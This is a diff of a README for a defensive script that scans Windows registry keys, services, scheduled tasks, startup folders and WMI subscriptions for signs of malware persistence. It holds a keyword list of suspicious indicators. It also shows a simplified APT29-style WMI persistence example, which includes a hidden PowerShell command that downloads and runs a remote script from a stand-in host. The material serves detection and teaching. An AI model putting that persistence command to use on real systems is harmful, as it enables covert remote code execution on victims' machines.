@@ -35,12 +35,14 @@ Script gives the following options:
 6. Scan Everything 
 7. Exit
 
+
 ### Potentially suspicious indicators
 
 The script outputs all results to a .txt file. However, entries that seem suspicious are plastered onto the CLI. These are the following indicators I came up with for files/commands/flags that can raise a red flag.
 
 Indicators
 - ```"AppData", "Temp", "Roaming", "LocalLow", "Public", "Users\\Public", "\.vbs", "\.js", "\.bat", "\.cmd", "\.ps1", "\.scr", "wscript.exe", "cscript.exe", "powershell.exe", "mshta.exe", "rundll32.exe", "cmd.exe", "System32\\Tasks", "Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved", "curl.exe", "wget.exe", "base64", "Invoke-", "DownloadString", "EncodedCommand" ```
+
 
 ### Registry and Windows Service Keys
 
@@ -62,12 +64,14 @@ Checks the following registry keys
 Service keys are also checked for the above indicators. 
 - HKLM:\SYSTEM\CurrentControlSet\Services
 
+
 ### Scheduled Tasks
 Malware will often create a scheduled task to run at a certain time to give persistence on the host device. This ensures even after a restart or shutdown the beacon can be reinstated.
 
 Scans all scheduled tasks that don't have \Microsoft\ in the path.
 
 Pretty popular persistence vector however is quite well known. One of the first SIEM rules you create should be for alerting on schtasks.exe usage or for tasks here that aren't known.
+
 
 ### Startup Folders
 Files that reside here are executed on startup. Much like scheduled tasks a very common area for malware to reside to ensure persistence after a restart/shutdown.
@@ -78,6 +82,7 @@ The following startup folders are checked
 
 Malicious files that are set to start on boot here are often named as legitimate Microsoft files and LOLBINs to avoid suspicion.
 
+
 ### WMI Event Subscription
 WMI subscriptions allow for commands to trigger when a system event occurs. Likewise to reg entries this method is fileless and quite a common method for persistence for more advanced malware.
 
@@ -87,12 +92,14 @@ An example of a malicious WMI subscription that was used by CozyBear (APT 29).
 
 -----Sets the condition for which the action is triggered (creation of a filter)-----
 - ```Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"```
+
 -----Sets the action when the filter is triggered (creation of a consumer)-----
 - ```CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http:cozynoobs.com/minecraft.ps1')"```
+
 -----Binds filter to the consumer (creates condition that runs consumer when filter occurs)
 - ```Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter.__PATH Consumer = $consumer.__PATH }```
 
-That was a very dumbed down version of the event subscription. But you get the idea of how it is structured. A filter is created which in turn when triggered runs the consumer (action) that runs the suspicious commands.
+That was a very dumbed down version of the actual event subscription used. But you get the idea of how it is structured. A filter is created which in turn when triggered runs the consumer (action) that runs the suspicious commands.
 
 The following subscriptions are checked
 - Get-WmiObject -Namespace root\subscription -Class __EventFilter
